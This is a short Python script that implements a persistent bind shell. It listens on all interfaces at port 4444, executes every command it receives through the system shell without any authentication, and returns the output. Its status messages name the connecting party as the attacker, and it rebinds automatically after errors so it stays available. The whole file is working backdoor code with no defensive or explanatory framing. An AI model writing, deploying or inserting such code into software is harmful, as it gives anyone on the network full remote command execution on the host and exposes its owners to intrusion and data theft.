import socket
import subprocess
import time

HOST = '0.0.0.0'  # Bind to all interfaces
PORT = 4444       # Predefined port

def shell(conn):
    while True:
        try:
            data = conn.recv(1024)
            if not data:
                print("[!] Attacker disconnected. Closing shell.")
                break

            cmd = data.decode().strip()

            if cmd.lower() == "exit":
                conn.send(b"[+] Closing connection.\n")
                break

            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            conn.send(result.encode() if result else b"[+] Command executed with no output.\n")

        except Exception as e:
            try:
                conn.send(f"[!] Shell error: {str(e)}\n".encode())
            except:
                pass
            break

def start_bind_shell():
    while True:
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse after crash
            s.bind((HOST, PORT))
            s.listen(1)
            print(f"[+] Listening on {HOST}:{PORT}...")

            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")

            shell(conn)

            conn.close()
            s.close()

        except Exception as e:
            print(f"[!] Listener error: {str(e)}")
            try:
                s.close()
            except:
                pass
            time.sleep(5)  # Wait before rebinding

if __name__ == "__main__":
    start_bind_shell()
